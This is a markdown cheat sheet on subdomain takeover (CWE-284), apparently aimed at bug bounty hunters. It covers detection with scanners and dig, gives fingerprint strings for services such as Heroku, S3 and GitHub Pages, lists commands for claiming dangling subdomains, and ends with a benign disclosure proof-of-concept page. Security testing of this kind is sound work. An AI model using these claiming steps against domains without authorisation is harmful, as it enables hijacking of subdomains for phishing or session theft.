# Subdomain Takeover

**CWE:** CWE-284 | Severity: High–Critical

---

## How It Happens

```
1. target.com has CNAME: dev.target.com → app.herokuapp.com
2. The Heroku app is deleted/expired
3. app.herokuapp.com is unclaimed
4. Attacker claims app.herokuapp.com
5. Attacker now controls dev.target.com
```

---

## Detection

```bash
# Nuclei (fastest, most comprehensive)
nuclei -l all_subs_resolved.txt -t takeovers/ -o takeovers.txt

# Subjack
./subjack -w all_subs_resolved.txt -t 100 -timeout 30 -o subjack.txt -ssl

# Sub404
python3 sub404.py -f all_subs_resolved.txt

# Manual check: verify CNAME points to unclaimed service
dig CNAME dev.target.com
# dev.target.com. 300 IN CNAME app.herokuapp.com.
# Then visit app.herokuapp.com → "No such app" = takeover possible
```

---

## Fingerprints by Service

| Service | Fingerprint |
|---------|-------------|
| GitHub Pages | `There isn't a GitHub Pages site here` |
| Heroku | `No such app` |
| AWS S3 | `NoSuchBucket` |
| Azure | `404 Web Site not found` |
| Shopify | `Sorry, this shop is currently unavailable` |
| Fastly | `Fastly error: unknown domain` |
| Tumblr | `There's nothing here` |
| UserVoice | `This UserVoice subdomain is currently available` |
| Ghost | `The thing you were looking for is no longer here` |
| Bitbucket | `Repository not found` |
| Zendesk | `Help Center Closed` |
| Desk.com | `Sorry, We Couldn't Find That Page` |

---

## Claiming the Takeover (PoC)

```bash
# GitHub Pages takeover
# 1. Create repo: attacker-gh-username/takeover-poc
# 2. Add CNAME file containing: vuln.target.com
# 3. Enable GitHub Pages in settings
# 4. Create index.html with: "subdomain-takeover-poc"
# 5. Verify: curl https://vuln.target.com → returns your page

# AWS S3 takeover
# 1. Create bucket with exact name from CNAME
# aws s3api create-bucket --bucket exact-bucket-name --region us-east-1
# 2. Upload index.html with poc content
# 3. Make bucket public

# Heroku takeover
# heroku create exact-app-name
# Add custom domain: heroku domains:add vuln.target.com
```

---

## Responsible Disclosure PoC

```html
<!-- Only upload this as PoC — remove immediately after triaging -->
<!DOCTYPE html>
<html>
<head><title>Subdomain Takeover PoC</title></head>
<body>
  <h1>Subdomain Takeover - PoC</h1>
  <p>This page demonstrates that <strong>vuln.target.com</strong> 
  is vulnerable to subdomain takeover by @su6osec.</p>
  <p>No harm was caused. Reported responsibly.</p>
</body>
</html>
```

> **Warning:** Never serve malicious content, phishing pages, or use the takeover for anything other than demonstrating the vulnerability. Report immediately.
